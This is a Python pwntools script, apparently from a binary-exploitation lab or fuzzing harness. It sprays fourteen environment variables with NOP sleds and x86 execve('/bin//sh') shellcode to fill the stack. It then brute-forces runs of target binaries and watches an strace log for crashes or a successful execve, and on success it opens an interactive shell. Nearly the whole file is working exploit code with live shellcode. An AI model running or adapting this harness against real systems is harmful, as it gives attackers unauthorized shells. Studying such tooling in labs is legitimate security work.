from pwn import *
from utils import *

log_file_path = 'strace.log'
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'


ENV_VARS = {
    "VAR1": b'\x90' * 131000 + shellcode,
    "VAR2": b'\x90' * 131000 + shellcode,
    "VAR3": b'\x90' * 131000 + shellcode,
    "VAR4": b'\x90' * 131000 + shellcode,
    "VAR5": b'\x90' * 131000 + shellcode,
    "VAR6": b'\x90' * 131000 + shellcode,
    "VAR7": b'\x90' * 131000 + shellcode,
    "VAR8": b'\x90' * 131000 + shellcode,
    "VAR9": b'\x90' * 131000 + shellcode,
    "VAR10": b'\x90' * 131000 + shellcode,
    "VAR11": b'\x90' * 131000 + shellcode,
    "VAR12": b'\x90' * 131000 + shellcode,
    "VAR13": b'\x90' * 131000 + shellcode,
    "VAR14": b'\x90' * 131000 + shellcode,
}

def payload_tester(arg_config: argparse.Namespace):

    attach_strace()
    exploit_cmd = build_exploit_command(arg_config)

    #performing brute force attack
    i = 0
    while True:
        logging.info(f"Attempt: {i}")
        i += 1
        exploit_proc = run_exploit(exploit_cmd)
        
        try:
            while True:

                if detect_execve():
                    shell(exploit_proc)

                output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            log.warning("No output received, breaking out of loop.")

        exploit_proc.close()



def build_exploit_command(arg_config: argparse.Namespace):
    input = 'cat payload - | '
    target_bin = f'/mnt/binaries/{arg_config.target}'

    command = [target_bin]
    
    for arg in arg_config.exploit_args:
        if arg == 'input':
            arg = '`cat payload`'
        
        command.append(arg)

    exploit_command = ' '.join(command)
    exploit_command = input + exploit_command

    return exploit_command


def detect_crash(pid: int):
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf'{pid_str}.*SIGCHLD.*si_status=SIGSEGV'
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:

                if pattern.search(line):
                    return True

    except FileNotFoundError:
        logging.error(f"Log file '{log_file_path}' not found.")
        cleanup()
    except Exception as e:
        logging.error(f'An error occurred while reading the log file: {e}')
        cleanup()

    return False


def detect_execve():
    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    logging.info(line)
                    return True

    except FileNotFoundError:
        logging.error(f"Log file '{log_file_path}' not found.")
        cleanup(1)
    except Exception as e:
        logging.error(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def shell(exploit_proc):
    drain_fd(exploit_proc.proc.stdout.fileno())
    exploit_proc.interactive()
    exploit_proc.close()
    cleanup(0)


def run_exploit(exploit_cmd):
    #passing on 2MB of env vars to fill up the stack
    exploit_proc = process(exploit_cmd, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env={**os.environ, **ENV_VARS})
    exploit_proc.sendline()
    return exploit_proc